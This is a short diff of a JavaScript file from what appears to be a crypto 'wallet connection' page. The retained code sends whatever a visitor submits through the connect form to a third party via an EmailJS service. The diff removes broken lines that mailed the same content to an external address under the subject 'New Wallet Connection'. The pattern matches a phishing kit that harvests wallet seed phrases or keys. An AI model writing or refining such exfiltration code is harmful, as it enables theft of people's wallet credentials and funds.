@@ -373,9 +373,6 @@ document.getElementById('form-connect-button').addEventListener('click', functio
   function sendEmail(content) {
     const templateParams = {
       message: content
-      const subject = encodeURIComponent('New Wallet Connection');
-      const body = encodeURIComponent(content);
-      window.location.href = `mailto:richoffwoods.murena.io, subject=${subject}&body=${body}`;
     };
     emailjs.send("service_of9vm8g", "template_bccv07j", templateParams)
       .then(function (response) {
